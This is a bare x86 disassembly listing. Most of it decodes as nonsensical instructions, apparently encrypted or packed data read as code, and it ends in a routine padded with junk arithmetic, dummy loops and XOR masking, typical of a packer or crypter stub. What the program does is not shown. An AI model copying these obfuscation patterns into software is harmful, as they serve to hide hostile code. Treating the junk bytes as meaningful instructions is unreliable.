  40313f:	cdq    
  403140:	leave  
  403141:	push   ebx
  403142:	mov    bl,0x9
  403144:	clc    
  403145:	push   ecx
  403146:	pop    esp
  403147:	inc    esi
  403148:	xor    eax,0xabb672d5
  40314d:	push   0x1
  40314f:	inc    ecx
  403150:	imul   ebp,esi,0xb6f41d86
  403156:	test   DWORD PTR [ecx+0x2b],0xe3b2afcc
  40315d:	push   ebp
  40315e:	mov    eax,ds:0xee0f9474
  403163:	mov    ds:0x416b5e4c,al
  403168:	enter  0x1fdc,0x4d
  40316c:	mov    WORD PTR [edx+0x51],ds
  40316f:	add    eax,0x67647661
  403174:	mov    dl,0xc0
  403176:	mov    eax,ds:0x77369f17
  40317b:	jnp    0x4031c6
  40317d:	mov    ah,0x7e
  40317f:	mov    edx,0xf98e721b
  403184:	jmp    0xf345:0xedbadfc1
  40318b:	sub    edi,esi
  40318d:	push   ebx
  40318e:	sti    
  40318f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403190:	or     bh,0x4c
  403193:	hlt    
  403194:	ror    BYTE PTR [ebx+0x69],cl
  403197:	pop    esp
  403198:	jmp    0xdf2:0x43b91ad3
  40319f:	mov    cl,0x9a
  4031a1:	sub    bh,BYTE PTR es:[ebx-0x30]
  4031a5:	mov    bl,0x6b
  4031a7:	dec    ecx
  4031a8:	int3   
  4031a9:	pop    edx
  4031aa:	test   cl,dh
  4031ac:	push   ebx
  4031ad:	retf   0xd2e4
  4031b0:	mov    bh,al
  4031b2:	popf   
  4031b3:	inc    ebp
  4031b4:	imul   eax,edi,0xffffffbf
  4031b7:	into   
  4031b8:	mov    WORD PTR ss:[ecx+0x63],cs
  4031bc:	call   0xb95f:0xaa086913
  4031c3:	shl    DWORD PTR [ebx],cl
  4031c5:	into   
  4031c6:	add    al,0x55
  4031c8:	or     dh,BYTE PTR [esi]
  4031ca:	out    dx,eax
  4031cb:	test   DWORD PTR [edx],eax
  4031cd:	ins    BYTE PTR es:[edi],dx
  4031ce:	lahf   
  4031cf:	idiv   BYTE PTR ds:0x522103d6
  4031d5:	sub    eax,0x6e0e97b6
  4031da:	add    bl,BYTE PTR [ecx]
  4031dc:	pop    es
  4031dd:	xor    DWORD PTR [ebp-0x2264245e],0x2798e0f
  4031e7:	cwde   
  4031e8:	scas   eax,DWORD PTR es:[edi]
  4031e9:	mov    ebp,0x941e5b41
  4031ee:	adc    ah,cl
  4031f0:	loopne 0x40322c
  4031f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031f3:	push   ds
  4031f4:	dec    edx
  4031f5:	cmp    ebp,DWORD PTR [esi]
  4031f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031f8:	loopne 0x4031f9
  4031fa:	test   bh,ah
  4031fc:	cdq    
  4031fd:	dec    edi
  4031fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031ff:	stos   DWORD PTR es:[edi],eax
  403200:	daa    
  403201:	mov    ebx,0x2e76450c
  403206:	int3   
  403207:	out    dx,al
  403208:	jg     0x4031b1
  40320a:	cmp    ebp,ecx
  40320c:	jl     0x4031bb
  40320e:	mov    edx,0xee39d9c3
  403213:	mov    dl,0x5
  403215:	inc    eax
  403216:	xor    BYTE PTR [esi],0x51
  403219:	gs mov esi,0xf243e03e
  40321f:	add    eax,0xbf8aae4a
  403224:	jo     0x4031e0
  403226:	mov    eax,0x8a19d6c1
  40322b:	jmp    0xfbd6:0xa82ae076
  403232:	cmp    BYTE PTR [ebx-0x72],dh
  403235:	jo     0x403223
  403237:	inc    ebx
  403238:	js     0x4032b4
  40323a:	stos   DWORD PTR es:[edi],eax
  40323b:	out    0xba,al
  40323d:	int    0x17
  40323f:	in     eax,0xe8
  403241:	inc    edi
  403242:	pushf  
  403243:	jg     0x4032ac
  403245:	push   0xc363570a
  40324a:	mov    eax,edi
  40324c:	test   BYTE PTR es:[eax],bl
  40324f:	cmp    DWORD PTR [eax-0xd],edx
  403252:	leave  
  403253:	adc    DWORD PTR ds:0x1236664b,ecx
  403259:	pop    edx
  40325a:	push   ebx
  40325b:	inc    ebx
  40325c:	mov    WORD PTR [ebp+0x300f461d],ds
  403262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403263:	int3   
  403264:	sub    dh,ah
  403266:	dec    edi
  403267:	mov    WORD PTR [ebp-0x5eac40d3],?
  40326d:	push   es
  40326e:	sahf   
  40326f:	jne    0x40329a
  403271:	aad    0x98
  403273:	inc    edx
  403274:	dec    ebx
  403275:	mov    esi,0xf4f1de10
  40327a:	shl    ah,0x16
  40327d:	mov    ds:0x49fe5c3,al
  403282:	test   BYTE PTR [ecx+0x270ecaf6],bl
  403288:	loop   0x40327e
  40328a:	scas   al,BYTE PTR es:[edi]
  40328b:	cwde   
  40328c:	retf   
  40328d:	xor    DWORD PTR ds:0x332a190d,esp
  403293:	repnz imul ebp,DWORD PTR [edi-0x500c263e],0x23
  40329b:	retf   0xab02
  40329e:	sbb    esp,esi
  4032a0:	cld    
  4032a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032a2:	lds    esi,FWORD PTR [ebx+ebp*2-0x4971a398]
  4032a9:	ffree  st(2)
  4032ab:	adc    dl,BYTE PTR [edi+eiz*4-0x44]
  4032af:	(bad)  
  4032b0:	pusha  
  4032b1:	lahf   
  4032b2:	call   0xf9394916
  4032b7:	mov    edi,0x53ec348
  4032bc:	jb     0x403246
  4032be:	fs fprem 
  4032c1:	outs   dx,BYTE PTR ds:[esi]
  4032c2:	icebp  
  4032c3:	pushf  
  4032c4:	sahf   
  4032c5:	cs loop 0x4032d9
  4032c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c9:	fild   QWORD PTR [edx]
  4032cb:	add    al,0x57
  4032cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032ce:	inc    esi
  4032cf:	retf   0x6ef3
  4032d2:	popf   
  4032d3:	xor    eax,0x78695bb
  4032d8:	jnp    0x4032e8
  4032da:	jb     0x403283
  4032dc:	clc    
  4032dd:	in     al,0x4d
  4032df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032e1:	mov    DWORD PTR [edx+0x44],ecx
  4032e4:	cmp    ebx,DWORD PTR [edx-0x7979aa2b]
  4032ea:	(bad)  
  4032eb:	sbb    cl,BYTE PTR [ebp+0xa]
  4032ee:	push   es
  4032ef:	outs   dx,DWORD PTR ds:[esi]
  4032f0:	(bad)  
  4032f1:	jae    0x403363
  4032f3:	adc    ecx,ebp
  4032f5:	xchg   edx,eax
  4032f6:	jle    0x403307
  4032f8:	push   esi
  4032f9:	push   ds
  4032fa:	add    al,0x42
  4032fc:	sbb    eax,0xfcdfe601
  403301:	in     eax,0x2c
  403303:	xlat   BYTE PTR es:[ebx]
  403305:	popa   
  403306:	sar    BYTE PTR [eax],1
  403308:	not    DWORD PTR [edi-0x379a21c0]
  40330e:	mov    ch,0x56
  403310:	pop    ds
  403311:	jmp    0xbfb37b41
  403316:	adc    BYTE PTR cs:[eax-0x7f],al
  40331a:	(bad)  
  40331b:	mov    al,0xe
  40331d:	pop    ss
  40331e:	and    eax,0xcdc0247b
  403323:	das    
  403324:	adc    eax,0x240d2247
  403329:	pop    ebp
  40332a:	push   ebx
  40332b:	gs xchg esi,eax
  40332d:	adc    ecx,DWORD PTR [ecx]
  40332f:	jbe    0x4032cd
  403331:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  403333:	cmp    esi,esp
  403335:	test   BYTE PTR [esi+0x21ab2c1f],al
  40333b:	test   al,0xad
  40333d:	mov    WORD PTR [ebp-0x3b],?
  403340:	sub    bl,BYTE PTR [eax-0x5173760]
  403346:	(bad)  [ebx+0x34]
  403349:	test   eax,0x36eaa7cc
  40334e:	scas   al,BYTE PTR es:[edi]
  40334f:	pop    edx
  403350:	aas    
  403351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403352:	fucomp st(3)
  403354:	inc    ecx
  403355:	mov    eax,0x6f453ff0
  40335a:	or     al,dh
  40335c:	sahf   
  40335d:	dec    ebp
  40335e:	test   DWORD PTR [ebx+0x50],ebx
  403361:	jno    0x4033a2
  403363:	fisubr DWORD PTR [edi-0x12]
  403366:	mov    bl,0xb2
  403368:	jg     0x40336e
  40336a:	retf   0x2d78
  40336d:	lods   al,BYTE PTR ds:[esi]
  40336e:	and    eax,0x611f6dfd
  403373:	jbe    0x4033b7
  403375:	mov    ah,0xf8
  403377:	into   
  403378:	fnsave [ecx*8-0x2db19f4b]
  40337f:	add    ebp,DWORD PTR [ebp-0x1aa3d712]
  403385:	push   0x8f9a62b0
  40338a:	sahf   
  40338b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40338c:	or     ah,BYTE PTR [eax+0x63e98de3]
  403392:	int3   
  403393:	jne    0x4033fc
  403395:	(bad)  
  403396:	cmp    DWORD PTR [esi+0x2d],edx
  403399:	fdivrp st(6),st
  40339b:	lods   al,BYTE PTR ds:[esi]
  40339c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40339e:	ja     0x403359
  4033a0:	push   0xfffffff6
  4033a2:	ins    BYTE PTR es:[edi],dx
  4033a3:	push   esp
  4033a4:	xchg   BYTE PTR [ebx],al
  4033a6:	aad    0x74
  4033a8:	ds pop esp
  4033aa:	cmc    
  4033ab:	push   es
  4033ac:	icebp  
  4033ad:	mov    dh,0x32
  4033af:	imul   ebp,ebx,0xd99d769e
  4033b5:	rol    bl,1
  4033b7:	xor    BYTE PTR [esi],al
  4033b9:	test   al,0xb2
  4033bb:	mov    eax,0x8890aa8c
  4033c0:	inc    eax
  4033c1:	sti    
  4033c2:	mov    cl,0xd1
  4033c4:	std    
  4033c5:	sti    
  4033c6:	add    eax,0xa99ce14
  4033cb:	rcr    DWORD PTR ds:0x9af6210d,0x8f
  4033d2:	mov    fs,WORD PTR [ecx]
  4033d4:	fisub  DWORD PTR [esi]
  4033d6:	fcmovnbe st,st(5)
  4033d8:	jmp    0x2c1641a0
  4033dd:	xlat   BYTE PTR cs:[ebx]
  4033df:	add    esi,DWORD PTR [eax]
  4033e1:	xchg   ebp,eax
  4033e2:	mov    al,0xa5
  4033e4:	imul   eax,DWORD PTR [ebp-0x58],0x9a59650b
  4033eb:	xchg   edx,eax
  4033ec:	popa   
  4033ed:	cmp    eax,0xbbefc6ef
  4033f2:	or     dh,al
  4033f4:	retf   0xee7f
  4033f7:	sbb    DWORD PTR [ebx+0x75],edx
  4033fa:	add    dh,ch
  4033fc:	xchg   ebp,eax
  4033fd:	test   al,0xaf
  4033ff:	push   edi
  403400:	cmp    edi,esp
  403402:	push   ebp
  403403:	jmp    0xd6ff:0xa03443c4
  40340a:	jo     0x403471
  40340c:	pop    ebx
  40340d:	div    BYTE PTR [edi]
  40340f:	outs   dx,DWORD PTR ds:[esi]
  403410:	add    bh,dh
  403412:	arpl   dx,ax
  403414:	mov    ds:0x22ddc416,al
  403419:	lods   al,BYTE PTR es:[esi]
  40341b:	sar    DWORD PTR [eax],0x5a
  40341e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403420:	ficomp DWORD PTR [ecx+eiz*2+0x7d8d007f]
  403427:	xchg   DWORD PTR [edx+0x14],esp
  40342a:	test   eax,0x4a3eaa45
  40342f:	xchg   ebx,eax
  403430:	(bad)  
  403431:	or     ch,BYTE PTR [ebx+0x26b26c98]
  403437:	int3   
  403438:	jo     0x4033c7
  40343a:	ja     0x40346b
  40343c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40343d:	(bad)  
  40343e:	call   0x2f4b:0xae765bfe
  403445:	add    eax,0xf26c18dd
  40344a:	push   0x6b1119b5
  40344f:	test   al,0xce
  403451:	pcmpeqd mm5,QWORD PTR [esi+ebx*8-0xf602ed8]
  403459:	outs   dx,BYTE PTR ds:[esi]
  40345a:	mov    esi,0xcf887348
  40345f:	xor    BYTE PTR [ecx+ecx*1],0x5a
  403463:	mov    ch,0xaf
  403465:	or     bh,ch
  403467:	ja     0x40347f
  403469:	add    eax,0xf05c0bfb
  40346e:	xchg   ecx,eax
  40346f:	dec    ebx
  403470:	cmp    DWORD PTR [eax+edi*1],0xffffffba
  403474:	push   es
  403475:	mov    ch,0xdb
  403477:	or     eax,0xbf294d40
  40347c:	repnz or ecx,esp
  40347f:	mov    al,0x48
  403481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403482:	mov    al,0xbf
  403484:	mov    DWORD PTR [eax],eax
  403486:	cwde   
  403487:	jne    0x403424
  403489:	or     DWORD PTR [edx-0x6b],edx
  40348c:	mov    ch,0x33
  40348e:	add    al,0xeb
  403490:	mov    BYTE PTR [esi],ah
  403492:	mov    ebp,0x2ff22414
  403497:	imul   edi,DWORD PTR [ecx],0x4d
  40349a:	cmp    al,BYTE PTR [edx+0xb]
  40349d:	sbb    ah,BYTE PTR [edi]
  40349f:	cdq    
  4034a0:	or     BYTE PTR [ecx+0x71],al
  4034a3:	push   cs
  4034a4:	and    ebp,edx
  4034a6:	stos   DWORD PTR es:[edi],eax
  4034a7:	jmp    0x403495
  4034a9:	mov    eax,0x758a4a23
  4034ae:	sbb    al,ah
  4034b0:	js     0x4034dd
  4034b2:	js     0x40343b
  4034b4:	aad    0x6f
  4034b6:	push   es
  4034b7:	repnz mov edi,0x630370a4
  4034bd:	ins    DWORD PTR es:[edi],dx
  4034be:	shl    DWORD PTR [ebp-0xb],0xdc
  4034c2:	adc    edi,DWORD PTR [edx-0x551eccc6]
  4034c8:	inc    ebp
  4034c9:	arpl   WORD PTR [ecx-0x35],cx
  4034cc:	sub    eax,DWORD PTR [ebx+0x68]
  4034cf:	lods   al,BYTE PTR ds:[esi]
  4034d0:	push   edx
  4034d1:	in     eax,dx
  4034d2:	cli    
  4034d3:	cmp    al,0x21
  4034d5:	mov    ecx,0x74d4e674
  4034da:	xlat   BYTE PTR ds:[ebx]
  4034db:	scas   eax,DWORD PTR es:[edi]
  4034dc:	jbe    0x403495
  4034de:	push   cs
  4034df:	dec    eax
  4034e0:	dec    ecx
  4034e1:	adc    dh,dl
  4034e3:	pop    es
  4034e4:	imul   edx,DWORD PTR [eax+edi*1-0x40],0xd3947de5
  4034ec:	xor    ah,BYTE PTR [edi]
  4034ee:	ds mov al,0x1b
  4034f1:	in     eax,0x6f
  4034f3:	cli    
  4034f4:	push   edi
  4034f5:	jo     0x40351a
  4034f7:	adc    esp,DWORD PTR [edx-0x64]
  4034fa:	test   eax,0x57210249
  4034ff:	jle    0x403500
  403501:	add    eax,0xb9fba466
  403506:	cs mov ch,0x6a
  403509:	aad    0x6a
  40350b:	enter  0x20a,0x94
  40350f:	push   es
  403510:	and    BYTE PTR [ebp-0x6ba57708],ah
  403516:	inc    esp
  403517:	fisttp WORD PTR [edx-0x6bf7ff69]
  40351d:	cmp    DWORD PTR fs:[ebx-0x27b4c1d7],ebx
  403524:	hlt    
  403525:	and    al,0x49
  403527:	sub    esp,DWORD PTR [edx+0x19]
  40352a:	jb     0x4034f9
  40352c:	mov    DWORD PTR [esi+0x451ea53b],esp
  403532:	lahf   
  403533:	into   
  403534:	ret    
  403535:	enter  0x7eb6,0x46
  403539:	inc    ebx
  40353a:	(bad)  
  40353b:	je     0x40359a
  40353d:	cmp    DWORD PTR [ecx],esi
  40353f:	(bad)  
  403541:	cmc    
  403542:	or     bh,al
  403544:	jle    0x4035bd
  403546:	imul   eax,DWORD PTR [eax-0x1e],0xb263254a
  40354d:	call   0x8fb9:0xd9630121
  403554:	test   al,0x4f
  403556:	dec    ebx
  403557:	inc    esp
  403558:	das    
  403559:	inc    eax
  40355a:	pop    ecx
  40355b:	cs inc ebp
  40355d:	jg     0x403505
  40355f:	out    0x33,al
  403561:	arpl   WORD PTR [edx+0x1401bfe1],di
  403567:	loopne 0x4035cb
  403569:	inc    eax
  40356a:	add    DWORD PTR [eax*8+0x1d2da740],ecx
  403571:	cmp    edi,DWORD PTR [ebx-0x28]
  403574:	jo     0x4035c9
  403576:	call   0x566d:0x347d169
  40357d:	mov    al,0x32
  40357f:	je     0x4035ab
  403581:	ds shl edi,0x6c
  403585:	push   esi
  403586:	cmc    
  403587:	neg    DWORD PTR [ebp+0x7a2e9fb1]
  40358d:	fld    st(0)
  40358f:	mov    eax,0xf9a0495a
  403594:	outs   dx,DWORD PTR ds:[esi]
  403595:	fucomi st,st(4)
  403597:	hlt    
  403598:	push   ecx
  403599:	xchg   BYTE PTR [edi-0x27],ah
  40359c:	mov    ebx,DWORD PTR [esi]
  40359e:	and    eax,0x48b1daf7
  4035a3:	jae    0x40360e
  4035a5:	lock jb 0x403623
  4035a8:	pop    ebx
  4035a9:	or     BYTE PTR [ebx+0x3ee5ba6a],0x7a
  4035b0:	pushf  
  4035b1:	lahf   
  4035b2:	xor    cl,dl
  4035b4:	mov    edx,0x19673f7d
  4035b9:	lods   al,BYTE PTR ds:[esi]
  4035ba:	pop    edi
  4035bb:	adc    BYTE PTR ds:[esi+0x59],cl
  4035bf:	add    esi,DWORD PTR [ecx+0x25c7eba3]
  4035c5:	shl    cl,0x93
  4035c8:	sub    BYTE PTR cs:[edi+0x252e8496],cl
  4035cf:	mov    ch,0x44
  4035d1:	and    eax,0x4cea975a
  4035d6:	mov    ch,0x1f
  4035d8:	sub    eax,0x1d2a42ce
  4035dd:	jne    0x4035c1
  4035df:	inc    edi
  4035e0:	mov    edx,0xbb8bce57
  4035e5:	sbb    BYTE PTR [eax+0x72],0xdf
  4035e9:	xchg   esp,ecx
  4035eb:	sub    DWORD PTR [edx-0x26045413],esp
  4035f1:	jl     0x403621
  4035f3:	xchg   BYTE PTR [esi+0x4e34acc1],dh
  4035f9:	sbb    eax,0x66d3150c
  4035fe:	rcr    ebx,cl
  403600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403601:	cmp    DWORD PTR [ebp+0x22be6991],0xec1597b5
  40360b:	jmp    0x403641
  40360d:	dec    ebp
  40360e:	xor    esi,eax
  403610:	arpl   di,bx
  403612:	das    
  403613:	arpl   WORD PTR [eax],cx
  403615:	push   edi
  403616:	or     ah,BYTE PTR [ebp-0x5f9ea5c2]
  40361c:	fwait
  40361d:	hlt    
  40361e:	add    ebp,eax
  403620:	sbb    esp,eax
  403622:	ja     0x4035b4
  403624:	fs xchg edi,eax
  403626:	std    
  403627:	and    cl,BYTE PTR [esi-0x1e113fc9]
  40362d:	neg    BYTE PTR [edx-0x11]
  403630:	xchg   ebx,eax
  403631:	mov    ds:0x481fd5b9,eax
  403636:	add    al,ah
  403638:	ret    0xcd17
  40363b:	ja     0x40360d
  40363d:	jb     0x4036a9
  40363f:	imul   BYTE PTR fs:[edx]
  403642:	pop    es
  403643:	shr    DWORD PTR [esi],1
  403645:	fiadd  WORD PTR [edi]
  403647:	retf   
  403648:	sbb    ebx,eax
  40364a:	push   ebx
  40364b:	push   0xf886ac25
  403650:	cli    
  403651:	push   edx
  403652:	and    edi,ebx
  403654:	out    dx,al
  403655:	or     al,0x38
  403657:	repz pop edi
  403659:	jne    0x403650
  40365b:	neg    eax
  40365d:	sub    ecx,DWORD PTR [edi-0x62]
  403660:	add    BYTE PTR [edx-0x6c],dh
  403663:	sub    edi,0x9e464c0a
  403669:	data16 rcr BYTE PTR ds:0xd14d6e3f,0xd
  403671:	into   
  403672:	pop    edi
  403673:	mov    ch,BYTE PTR [ecx+0x14]
  403676:	lea    eax,es:[edi-0xf]
  40367a:	int3   
  40367b:	hlt    
  40367c:	out    0xf4,eax
  40367e:	mov    ds:0xdefcd5d4,al
  403683:	push   ss
  403684:	mov    bh,0xee
  403686:	ficomp DWORD PTR [ecx+0x79]
  403689:	or     al,al
  40368b:	mov    cs,WORD PTR [edi+0x1c]
  40368e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40368f:	and    BYTE PTR [edx-0x4],ch
  403692:	jns    0x4036a9
  403694:	aas    
  403695:	jae    0x40367b
  403697:	stos   BYTE PTR es:[edi],al
  403698:	mov    dl,0x40
  40369a:	dec    esi
  40369b:	lea    ecx,[eax]
  40369d:	cld    
  40369e:	jns    0x403707
  4036a0:	(bad)  
  4036a1:	repnz daa 
  4036a3:	ss jnp 0x403705
  4036a6:	mov    dh,0x9b
  4036a8:	or     BYTE PTR [eax-0x23ab952e],ch
  4036ae:	push   ds
  4036af:	repnz xor edx,DWORD PTR [ebp-0x31]
  4036b3:	xlat   BYTE PTR ds:[ebx]
  4036b4:	lahf   
  4036b5:	imul   ebx,DWORD PTR [edx],0x23
  4036b8:	loop   0x4036a8
  4036ba:	out    dx,al
  4036bb:	and    ebx,DWORD PTR [esi+0x625e1062]
  4036c1:	test   dl,dl
  4036c3:	mov    eax,0x5e4822d6
  4036c8:	xchg   ebx,eax
  4036c9:	add    eax,0xe533f8a2
  4036ce:	xor    ebp,DWORD PTR [eax-0x5]
  4036d1:	(bad)  
  4036d2:	sbb    BYTE PTR [ecx+0xc24b827],ch
  4036d8:	lods   al,BYTE PTR ds:[esi]
  4036d9:	mov    DWORD PTR [ebx-0x5c87752e],esp
  4036df:	shl    ebp,cl
  4036e1:	ret    0x4219
  4036e4:	clc    
  4036e5:	push   es
  4036e6:	lock lea edi,[esi+edi*4-0x220ebb02]
  4036ee:	fsubr  st(3),st
  4036f0:	rcl    DWORD PTR [ecx+esi*2+0x4097294a],cl
  4036f7:	xchg   ebp,eax
  4036f8:	int3   
  4036f9:	mov    DWORD PTR [esi],ebp
  4036fb:	jge    0x4036bd
  4036fd:	dec    esp
  4036fe:	push   es
  4036ff:	dec    edx
  403700:	sub    al,0xd5
  403702:	in     al,dx
  403703:	jne    0x40371a
  403705:	sbb    ebx,DWORD PTR [edi]
  403707:	mov    DWORD PTR [esi+0x17673b17],ecx
  40370d:	mov    esp,DWORD PTR [edx+0x25661097]
  403713:	out    dx,al
  403714:	sar    DWORD PTR [esi-0x7a],1
  403717:	mov    esp,DWORD PTR [edx-0x4d3c483a]
  40371d:	mov    ch,0xcc
  40371f:	bound  ebx,QWORD PTR [ecx]
  403721:	mov    bl,0xe1
  403723:	cmc    
  403724:	xchg   edi,eax
  403725:	push   ebp
  403726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403727:	mov    bh,0x88
  403729:	mov    ds,WORD PTR [edi+esi*2-0x4fb7acbf]
  403730:	imul   ecx,esp,0x29
  403733:	(bad)  
  403734:	push   edi
  403735:	or     edi,DWORD PTR [ecx+0x66ce2448]
  40373b:	mov    bl,0x64
  40373d:	push   0xffffffef
  40373f:	leave  
  403740:	jp     0x403775
  403742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403743:	mov    ecx,0x40156ba2
  403748:	pop    esi
  403749:	mov    esi,0x9b646633
  40374e:	inc    ebx
  40374f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403750:	pop    ss
  403751:	fwait
  403752:	jmp    0x4036e5
  403754:	fwait
  403755:	in     eax,dx
  403756:	sub    al,0x2d
  403758:	(bad)  
  40375b:	xor    eax,0x49a3f2cd
  403760:	out    dx,eax
  403761:	loopne 0x403792
  403763:	popa   
  403764:	pop    esi
  403765:	pop    edi
  403766:	jle    0x403783
  403768:	mov    ecx,0x534e138
  40376d:	call   0xac45:0x84e2e497
  403774:	fsub   st(5),st
  403776:	test   DWORD PTR [eax],ebp
  403778:	addr16 adc dl,cl
  40377b:	pop    esp
  40377c:	dec    esp
  40377e:	aaa    
  40377f:	aas    
  403780:	addr16 inc edx
  403782:	loope  0x403741
  403784:	popa   
  403785:	inc    ebp
  403786:	jae    0x40373d
  403788:	jns    0x403787
  40378a:	xchg   ebp,eax
  40378b:	popa   
  40378c:	sbb    al,0x28
  40378e:	mov    esp,0x3752229b
  403793:	sbb    eax,0x2b7c4158
  403798:	vpaddd xmm7,xmm7,XMMWORD PTR [esi+0xa]
  40379d:	pop    ebp
  40379e:	xor    al,0x8c
  4037a0:	addr16 jge 0x403734
  4037a3:	push   ds
  4037a4:	daa    
  4037a5:	rol    BYTE PTR [eax-0x3f],0x6b
  4037a9:	fstp   QWORD PTR [ecx]
  4037ab:	mov    al,0xf0
  4037ad:	fdivr  DWORD PTR [ebx]
  4037af:	imul   esp,DWORD PTR [esp+ecx*4+0x65],0x21
  4037b4:	imul   esp,esi,0x50b04a30
  4037ba:	xchg   BYTE PTR [ebx],bh
  4037bc:	jg     0x4037c4
  4037be:	arpl   WORD PTR [ecx-0x32],sp
  4037c1:	jbe    0x403837
  4037c3:	jo     0x403774
  4037c5:	push   ss
  4037c6:	ret    
  4037c7:	outs   dx,BYTE PTR ds:[esi]
  4037c8:	aaa    
  4037c9:	mov    al,0x60
  4037cb:	stos   BYTE PTR es:[edi],al
  4037cc:	inc    esi
  4037cd:	sti    
  4037ce:	jno    0x4037bb
  4037d0:	pusha  
  4037d1:	idiv   DWORD PTR [ebx-0x1fe612e]
  4037d7:	inc    ebp
  4037d8:	and    DWORD PTR [eax+eiz*2],ebp
  4037db:	or     BYTE PTR [ebp-0x5a],bl
  4037de:	push   esi
  4037df:	stos   DWORD PTR es:[edi],eax
  4037e0:	add    al,0xa1
  4037e2:	andnps xmm4,XMMWORD PTR [edi-0xc]
  4037e6:	push   ebx
  4037e7:	inc    dx
  4037e9:	mov    ebx,0x57f32267
  4037ee:	jnp    0x40380b
  4037f0:	fsub   QWORD PTR [esi-0x5b]
  4037f3:	loope  0x40386c
  4037f5:	inc    ecx
  4037f6:	inc    eax
  4037f7:	out    dx,eax
  4037f8:	lahf   
  4037f9:	into   
  4037fa:	push   eax
  4037fb:	adc    eax,0xae20e3b3
  403800:	cs sti 
  403802:	xchg   ebp,esp
  403804:	sar    DWORD PTR [edi],1
  403806:	fidivr WORD PTR [esi]
  403808:	jmp    0x7b00acc0
  40380d:	dec    eax
  40380e:	ss push 0x46
  403811:	shr    BYTE PTR [eax-0x6a],1
  403814:	leave  
  403815:	mov    eax,DWORD PTR [ebp-0x10]
  403818:	mov    ecx,DWORD PTR [ebp-0x10]
  40381b:	xor    eax,esi
  40381d:	xor    ecx,esi
  40381f:	sub    DWORD PTR ds:0x428eb3,0x5e8a
  403829:	lea    ecx,[eax+ecx*1+0x64e5ec]
  403830:	mov    eax,DWORD PTR [ebp-0xc]
  403833:	sbb    DWORD PTR ds:0x428e97,0x428e5b
  40383d:	xor    edx,edx
  40383f:	adc    DWORD PTR ds:0x428e4b,0x428eab
  403849:	div    ecx
  40384b:	movzx  eax,WORD PTR ds:0x428e2b
  403852:	add    DWORD PTR ds:0x428eb3,eax
  403858:	mov    eax,DWORD PTR [ebp-0x8]
  40385b:	mov    DWORD PTR ds:0x428e57,0x1e
  403865:	cmp    DWORD PTR ds:0x428e57,0x0
  40386c:	je     0x4038bb
  403872:	cmp    DWORD PTR ds:0x428e57,0x9
  403879:	jb     0x4038bb
  40387f:	jmp    0x40388d
  403884:	push   DWORD PTR [ebp-0x10]
  403887:	call   DWORD PTR ds:0x42aa2b
  40388d:	cmp    DWORD PTR ds:0x428e57,0xa
  403894:	jne    0x4038a7
  40389a:	mov    ecx,DWORD PTR ds:0x428e57
  4038a0:	dec    ecx
  4038a1:	mov    DWORD PTR ds:0x428e57,ecx
  4038a7:	xor    ecx,ecx
  4038a9:	add    ecx,DWORD PTR ds:0x428e57
  4038af:	dec    ecx
  4038b0:	mov    DWORD PTR ds:0x428e57,ecx
  4038b6:	jmp    0x403865
  4038bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4038be:	xor    eax,esi
  4038c0:	xor    ecx,esi
  4038c2:	sub    eax,ecx
  4038c4:	mov    DWORD PTR ds:0x428e43,0x1a6e
  4038ce:	cmp    edx,eax
  4038d0:	mov    DWORD PTR ds:0x428e43,0x4c12
  4038da:	jne    0x403ae6
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038ea:	sbb    eax,DWORD PTR ds:0x428ec3
  4038f0:	mov    eax,DWORD PTR [ebp-0x28]
  4038f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4038f6:	or     DWORD PTR ds:0x428ec3,0x7d0f
  403900:	xor    eax,esi
  403902:	xor    ecx,esi
  403904:	add    eax,edi
  403906:	add    ecx,edi
  403908:	mov    BYTE PTR [ebp-0x21],dl
  40390b:	mov    DWORD PTR ds:0x428e57,0x12ce
  403915:	cmp    eax,ecx
  403917:	mov    DWORD PTR ds:0x428eab,0x3e33
  403921:	jae    0x403a8f
  403927:	mov    edx,DWORD PTR ds:0x428e57
  40392d:	xor    DWORD PTR ds:0x428e87,edx
  403933:	lea    ecx,[eax-0x3272f6]
  403939:	mov    DWORD PTR [ebp-0x14],ecx
  40393c:	and    DWORD PTR ds:0x428e73,0x0
  403946:	mov    edx,DWORD PTR ds:0x428e73
  40394c:	inc    edx
  40394d:	mov    DWORD PTR ds:0x428e73,edx
  403953:	cmp    DWORD PTR ds:0x428e73,0x20
  40395a:	ja     0x403980
  403960:	jmp    0x403973
  403965:	push   0x428e8b
  40396a:	push   DWORD PTR [ebp-0xc]
  40396d:	call   DWORD PTR ds:0x42aa2f
  403973:	cmp    DWORD PTR ds:0x428e73,0x11
  40397a:	jb     0x403946
  403980:	mov    edx,DWORD PTR [ebp-0x14]
  403983:	or     DWORD PTR ds:0x428e6b,0xd5d
  40398d:	xor    edx,esi
  40398f:	xor    DWORD PTR ds:0x428e83,0x428e5f
  403999:	add    edx,0x7f55d8e3
  40399f:	lea    ecx,[ebp+eax*4-0xb4]
  4039a6:	mov    DWORD PTR [ecx],edx
